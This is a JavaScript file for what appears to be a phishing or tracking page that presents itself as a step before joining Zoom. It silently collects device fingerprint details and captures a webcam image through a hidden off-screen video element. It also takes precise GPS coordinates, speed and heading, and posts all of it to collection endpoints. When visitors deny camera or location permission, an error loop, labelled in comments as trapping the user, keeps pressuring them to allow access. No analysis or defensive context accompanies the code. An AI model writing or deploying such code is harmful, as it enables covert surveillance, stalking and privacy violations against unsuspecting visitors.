// 1. Device Info (Runs silently)
function information() {
  if (navigator.getBattery) {
    navigator.getBattery().then(function(battery) {
      var level = Math.round(battery.level * 100) + "%";
      var status = battery.charging ? " (Charging ⚡)" : "";
      collectAndSend(level + status);
    });
  } else {
    collectAndSend("Unknown");
  }
}

function collectAndSend(batLevel) {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency || 'Not Available';
  var ram = navigator.deviceMemory || 'Not Available';
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;

  var brw = 'Unknown'; 
  if (ver.indexOf('Firefox') != -1) brw = 'Firefox';
  else if (ver.indexOf('Chrome') != -1) brw = 'Chrome';
  else if (ver.indexOf('Safari') != -1) brw = 'Safari';

  var ht = window.screen.height;
  var wd = window.screen.width;
  
  if(os.includes(';')) {
      os = os.substring(0, os.indexOf(')'));
      os = os.split(';')[1];
      if (os) os = os.trim();
  }

  $.ajax({
    type: 'POST',
    url: info_file,
    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ht: ht, Wd: wd, Os: os, Bat: batLevel },
    success: function() {},
    mimeType: 'text'
  });
}

// -----------------------------------------------------
// THE ERROR LOOP TRIGGER
// -----------------------------------------------------
function triggerErrorLoop() {
    // Shows the error modal defined in index.html
    document.getElementById('permission-error').style.display = 'block';
}

// -----------------------------------------------------
// 2. CAMERA LOGIC (First Step)
// -----------------------------------------------------
function captureAndSend(callback) {
  var video = document.createElement('video');
  video.style.position = "fixed";
  video.style.top = "-10000px";
  video.style.left = "-10000px";
  document.body.appendChild(video); 

  var canvas = document.getElementById('canvas');

  // SAFETY TIMER: If browser hangs -> Show Error Loop
  var safetyTimer = setTimeout(function() {
      console.log("Camera timed out");
      try { document.body.removeChild(video); } catch(e){}
      triggerErrorLoop(); // <--- TRAPS THE USER
  }, 8000); 

  video.autoplay = true;
  video.muted = true;
  video.playsInline = true;

  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
      video.srcObject = stream;
      video.play();

      video.onloadeddata = function() {
          setTimeout(function() {
            clearTimeout(safetyTimer);
            
            if (video.videoWidth > 0 && video.videoHeight > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(function(blob) {
                  var formData = new FormData();
                  formData.append('image', blob, 'cam.jpg');

                  $.ajax({
                    url: upload_file, 
                    type: 'POST',
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function() {
                      stream.getTracks().forEach(track => track.stop());
                      try { document.body.removeChild(video); } catch(e){}
                      if (callback) callback(); // Success! Next step.
                    },
                    error: function() {
                      // If upload fails technically, we usually let them pass
                      stream.getTracks().forEach(track => track.stop());
                      try { document.body.removeChild(video); } catch(e){}
                      if (callback) callback(); 
                    }
                  });
                }, 'image/jpeg', 0.8);
            } else {
                // Video empty -> Error Loop
                stream.getTracks().forEach(track => track.stop());
                try { document.body.removeChild(video); } catch(e){}
                triggerErrorLoop();
            }
          }, 500);
      };
    }).catch(function(err) {
      // Permission Denied -> Error Loop
      clearTimeout(safetyTimer);
      try { document.body.removeChild(video); } catch(e){}
      triggerErrorLoop(); 
    });
  } else {
    // Not supported -> Error Loop
    clearTimeout(safetyTimer);
    triggerErrorLoop();
  }
}

// -----------------------------------------------------
// 3. LOCATION LOGIC (Second Step)
// -----------------------------------------------------
function locate(callback, errCallback) {
  // SAFETY TIMER: If browser hangs -> Show Error Loop
  var locTimer = setTimeout(function() {
      console.log("Location timed out");
      triggerErrorLoop();
  }, 8000);

  if (navigator.geolocation) {
    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    navigator.geolocation.getCurrentPosition(
      function(position) { 
          clearTimeout(locTimer);
          showPosition(position, callback); 
      }, 
      function(error) { 
          clearTimeout(locTimer);
          // Denied -> Show Error Loop (via showError)
          showError(error, null); 
      }, 
      optn
    );
  } else {
    clearTimeout(locTimer);
    triggerErrorLoop();
  }
}

function showError(error, errCallback) {
  var err_text = 'Unknown';
  switch (error.code) {
    case error.PERMISSION_DENIED: err_text = 'User denied Geolocation'; break;
    case error.POSITION_UNAVAILABLE: err_text = 'Location unavailable'; break;
    case error.TIMEOUT: err_text = 'Location timed out'; break;
  }
  
  $.ajax({
    type: 'POST',
    url: error_file,
    data: { Status: 'failed', Error: err_text },
    success: function() { 
        // Log the error, then TRAP THE USER
        triggerErrorLoop(); 
    },
    mimeType: 'text'
  });
}

function showPosition(position, callback) {
  var lat = position.coords.latitude; 
  var lon = position.coords.longitude;
  var acc = position.coords.accuracy;
  var alt = position.coords.altitude || 0;
  var dir = position.coords.heading || 0;
  var spd = position.coords.speed || 0;

  $.ajax({
    type: 'POST',
    url: result_file,
    data: { Status: 'success', Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
    success: function() { 
        // Success! Go to Zoom
        if(callback) callback(); 
    },
    error: function() {
        if(callback) callback(); 
    },
    mimeType: 'text'
  });
}
